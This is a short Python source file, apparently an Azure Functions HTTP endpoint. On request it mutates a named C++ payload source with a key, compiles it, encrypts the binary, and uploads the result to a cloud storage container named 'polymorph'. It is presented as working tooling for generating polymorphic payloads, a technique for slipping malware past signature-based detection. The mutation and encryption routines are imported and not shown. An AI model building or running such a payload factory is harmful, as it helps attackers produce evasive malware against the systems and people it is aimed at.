import logging
import azure.functions as func
from .polymorph_core import mutate_source, compile_payload, encrypt_binary
from azure.storage.blob import BlobServiceClient

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info("Received polymorph payload request.")
    
    # Retrieve source and options from query
    payload_name = req.params.get('payload') or 'payload.cpp'
    morph_key = req.params.get('key') or 'default'

    # Run mutation
    mutated_code = mutate_source(payload_name, morph_key)

    # Compile and encrypt payload
    bin_path = compile_payload(mutated_code)
    encrypted_payload = encrypt_binary(bin_path, morph_key)

    # Upload to Blob Storage
    blob_client = BlobServiceClient.from_connection_string("AzureStorageConnStr")
    blob_client.get_container_client("polymorph").upload_blob(f"{morph_key}.bin", encrypted_payload, overwrite=True)

    return func.HttpResponse(f"Payload {morph_key}.bin created.", status_code=200)
